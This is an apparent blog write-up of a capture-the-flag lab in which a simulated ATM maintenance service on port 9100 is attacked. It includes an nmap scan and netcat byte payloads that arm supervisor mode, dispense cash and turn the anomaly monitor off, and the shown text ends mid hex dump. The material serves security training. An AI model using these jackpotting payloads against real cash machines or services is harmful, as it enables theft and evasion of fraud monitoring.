@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="ro-ro">
+<head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Jackpot | Cyber Blog-ul lui Novac</title>
+<meta property="og:title" content="Jackpot | Cyber Blog-ul lui Novac" />
+<meta name="twitter:title" content="Jackpot | Cyber Blog-ul lui Novac" />
+<meta itemprop="name" content="Jackpot | Cyber Blog-ul lui Novac" />
+<meta name="application-name" content="Jackpot | Cyber Blog-ul lui Novac" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="ro-ro" />
+<meta name="language" content="ro-ro" />
+
+  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-10-12T08:09:49Z />
+    <meta property="article:published_time" content=2026-10-12T08:09:49Z />
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Jackpot",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2026-10-12",
+        "description": "",
+        "wordCount":  1711 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2026-10-12",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Cyber Blog-ul lui Novac"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/">
+  <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
+  <meta property="og:title" content="Jackpot">
+  <meta property="og:description" content="link:https://tryhackme.com/room/jackpot
+Description:
+A branch ATM at &#34;Earth&#39;s National Bank&#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&#39;s native hardware language with no authentication worth the name. The cash dispenser doesn&#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette. 3 ports opened on the first scan">
+  <meta property="og:locale" content="ro_ro">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:modified_time" content="2026-10-12T08:09:49+00:00">
+    <meta property="article:tag" content="Note">
+    <meta property="article:tag" content="Journal">
+    <meta property="article:tag" content="CyberStuff">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Jackpot">
+  <meta name="twitter:description" content="link:https://tryhackme.com/room/jackpot
+Description:
+A branch ATM at &#34;Earth&#39;s National Bank&#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&#39;s native hardware language with no authentication worth the name. The cash dispenser doesn&#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette. 3 ports opened on the first scan">
+
+
+    
+
+    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/">
+    <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+
+<meta name="msapplication-config" content="/blog/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
+
+    
+    
+    
+      
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+<body>
+    <div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://novaclearnscyber.github.io/blog/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/blog/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            
+        </div>
+    </nav>
+</div>
+
+    <style>
+        .custom-banner {
+            width: 100%;
+
+            height: {
+                    {
+                    .Site.Params.banner_height | default "300px"
+                }
+            }
+
+            ;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (max-width: 768px) {
+            .custom-banner {
+                height: 200px !important;
+                 
+            }
+        }
+    </style>
+
+    
+    <div class="custom-banner">
+        <div
+            style="background-image: url('https://novaclearnscyber.github.io/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
+        </div>
+    </div>
+    
+
+    <div id="content">
+        
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Jackpot</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-10-12T08:09:49&#43;00:00" itemprop="datePublished"> 12 oct. 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>link:<a href="https://tryhackme.com/room/jackpot">https://tryhackme.com/room/jackpot</a><br>
+Description:</p>
+<pre tabindex="0"><code>A branch ATM at &#34;Earth&#39;s National Bank&#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&#39;s native hardware language with no authentication worth the name.
+
+The cash dispenser doesn&#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
+</code></pre><p>3 ports opened on the first scan</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ nmap -sV -p- --min-rate <span style="color:#ae81ff">5000</span> &lt;YOUR_IP&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.99 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-10-11 07:17 -0400
+</span></span><span style="display:flex;"><span>Stats: 0:00:08 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing SYN Stealth Scan
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 61.52% <span style="color:#66d9ef">done</span>; ETC: 07:17 <span style="color:#f92672">(</span>0:00:05 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:00:19 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 66.67% <span style="color:#66d9ef">done</span>; ETC: 07:17 <span style="color:#f92672">(</span>0:00:03 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.114.179.22 <span style="color:#f92672">(</span>10.114.179.22<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http       BaseHTTPServer 0.6 <span style="color:#f92672">(</span>Python 3.12.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>9100/tcp open  jetdirect?
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 19.58 seconds
+</span></span></code></pre></div><p>the web server gives us a file to download<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020261010092334.png" alt="">
+<br>
+will run it later, let&rsquo;s investigate the other port opened.<br>
+The other opened port is 9100 which nmap tells us is jetdirect</p>
+<pre tabindex="0"><code>HP JetDirect is a network printing protocol primarily used for sending print jobs directly to network-connected printers. It utilizes TCP port 9100 for raw printing, offering a simple and direct method for print data transfer.
+</code></pre><p>we will use it later, let&rsquo;s run the file for now :<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020261011072735.png" alt="">
+<br>
+the jackpot file is some kind of encoder that will return us a code for the web-server<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020261011072857.png" alt="">
+<br>
+lets investigate the JetDirect service :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ echo cv | nc &lt;YOUR_IP&gt;  <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>ok cool , we can send messages directly to the service using the format specified,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x01\x00\x00\x03\x03\x00\x00&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}</span>�<span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;cassettes&#34;</span>: <span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;CST1&#34;</span>, <span style="color:#e6db74">&#34;denom&#34;</span>: 10, <span style="color:#e6db74">&#34;count&#34;</span>: 0<span style="color:#f92672">}</span>, <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;CST2&#34;</span>, <span style="color:#e6db74">&#34;denom&#34;</span>: 20, <span style="color:#e6db74">&#34;count&#34;</span>: 0<span style="color:#f92672">}</span>, <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;CST3&#34;</span>, <span style="color:#e6db74">&#34;denom&#34;</span>: 50, <span style="color:#e6db74">&#34;count&#34;</span>: 0<span style="color:#f92672">}</span>, <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;CST4&#34;</span>, <span style="color:#e6db74">&#34;denom&#34;</span>: 100, <span style="color:#e6db74">&#34;count&#34;</span>: 0<span style="color:#f92672">}]</span>, <span style="color:#e6db74">&#34;remaining_notes&#34;</span>: 0<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>here are the commands we can execute on the machine using the 9100 port</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;interface&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway (XFS bridge)&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;device_class&#34;</span>: <span style="color:#e6db74">&#34;CDM&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;commands&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;WFS_INF_CDM_STATUS&#34;</span>: <span style="color:#e6db74">&#34;0x301&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;WFS_INF_CDM_CASH_UNIT_INFO&#34;</span>: <span style="color:#e6db74">&#34;0x303&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;WFS_INF_CDM_CAPABILITIES&#34;</span>: <span style="color:#e6db74">&#34;0x304&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;WFS_CMD_CDM_DISPENSE&#34;</span>: <span style="color:#e6db74">&#34;0x401&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;WFS_CMD_CDM_ARM&#34;</span>: <span style="color:#e6db74">&#34;0x4f0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;WFS_CMD_CDM_SET_MONITOR&#34;</span>: <span style="color:#e6db74">&#34;0x4f1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;WFS_CMD_CDM_GET_FLAG&#34;</span>: <span style="color:#e6db74">&#34;0x4ff&#34;</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;max_dispense&#34;</span>: <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Ok so we can use the ./jackpot binary to get a code to set the ATM in supervisor mode, we have to specify x08 because that is the length of the code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\xf0\x00\x08&lt;YOUR_CODE&gt;&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;armed - supervisor mode&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>after that we can make the first transaction using <code>&quot;WFS_CMD_CDM_DISPENSE&quot;: &quot;0x401&quot;,</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\x01\x00\x00&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}</span>I<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;notes&#34;</span>: 40, <span style="color:#e6db74">&#34;value&#34;</span>: 4000, <span style="color:#e6db74">&#34;remaining_notes&#34;</span>: 240<span style="color:#f92672">}</span>^C
+</span></span></code></pre></div><p>but if we try to make another transaction the same way the service will be blocked for 45 second and it will reset :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\x01\x00\x00&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}{{</span><span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_ERR_CDM_LOCKED&#34;</span>, <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;anomalous dispense with null transaction id -&gt; machine locked&#34;</span>, <span style="color:#e6db74">&#34;lock_seconds&#34;</span>: 45<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>the web server:<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020261010100440.png" alt="">
+<br>
+so what can we do in this case ?<br>
+(for the record i tried a lot of different ways to solve this, from racing condition to waiting some time thinking it was a cooldown system in place, none of them were true, i was much simpler)</p>
+<p>Looking back at the command list for the service we can see that there is a set monitor command</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;WFS_CMD_CDM_SET_MONITOR&#34;</span>: <span style="color:#e6db74">&#34;0x4f1&#34;</span>,
+</span></span></code></pre></div><p>so what if we try to set the monitor off using this?<br>
+using this payload we can achieve that <code>'\x02\x00\x00\x04\xf1\x00\x03off'</code> , the payload basically overwrites the monitor settings , x03 is the length of the string &ldquo;off&rdquo;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\xf1\x00\x03off&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span> | xxd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>00000000: 01c5 7b22 <span style="color:#ae81ff">7365</span> <span style="color:#ae81ff">7276</span> <span style="color:#ae81ff">6963</span> <span style="color:#ae81ff">6522</span> 3a20 <span style="color:#ae81ff">2242</span>  ..<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;B
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000010: 7261 6e63 6820 456e 6769 6e65 6572 696e  ranch Engineerin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000020: 6720 4761 7465 7761 7922 2c20 2270 726f  g Gateway&#34;</span>, <span style="color:#e6db74">&#34;pro
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000030: 746f 636f 6c22 3a20 2258 4653 2062 7269  tocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bri
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000040: 6467 6522 2c20 2272 6571 7565 7374 5f66  dge&#34;</span>, <span style="color:#e6db74">&#34;request_f
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000050: 6f72 6d61 7422 3a20 2231 2062 7974 6520  ormat&#34;</span>: <span style="color:#e6db74">&#34;1 byte
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000060: 6d73 675f 7479 7065 202b 2034 2062 7974  msg_type + 4 byt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000070: 6520 6269 672d 656e 6469 616e 2063 6f6d  e big-endian com
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000080: 6d61 6e64 2069 6420 2b20 3220 6279 7465  mand id + 2 byte
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000090: 2062 6967 2d65 6e64 6961 6e20 6c65 6e67   big-endian leng
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000a0: 7468 202b 203c 6c65 6e67 7468 3e20 6279  th + &lt;length&gt; by
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000b0: 7465 7320 6f66 2064 6174 6122 2c20 2272  tes of data&#34;</span>, <span style="color:#e6db74">&#34;r
